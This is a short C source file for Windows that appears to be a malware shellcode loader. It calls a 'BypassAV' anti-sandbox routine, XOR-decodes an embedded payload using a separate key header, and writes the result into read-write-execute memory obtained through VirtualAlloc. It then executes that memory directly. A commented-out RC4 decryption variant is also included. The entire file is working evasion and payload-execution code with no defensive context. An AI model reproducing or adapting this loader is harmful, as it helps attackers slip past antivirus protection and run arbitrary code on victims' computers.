#include <windows.h>
#include "AntiSandbox.h"
#include "payload.h"
#include "key.h"
//#include "RC4.h"

void ExecutePayload();


int main(int argc, char const *argv[])
{
	CreateThread(NULL,0,BypassAV,NULL,0,NULL);
	if(BypassAV(NULL)){
		ExecutePayload();	
	}
	return 0;
}

void ExecutePayload(){

	for(int i = 0; i < sizeof(Payload); i++) {
		Payload[i] = (Payload[i] ^ Payload_key[(i%sizeof(Payload_key))]);
	}	
/*

	unsigned char s[256] = {0}; // Creates S box for key scheduling aglhorithm
	rc4_init(s,Payload_key); // Apply key scheduling aglhorithm
	rc4_decrypt(s,Payload);  // Decrypt payload...
*/

	char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(Payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(BUFFER, Payload, sizeof(Payload));
	(*(void(*)())BUFFER)();
	
	while(true){
		Sleep(1000);
	}
}


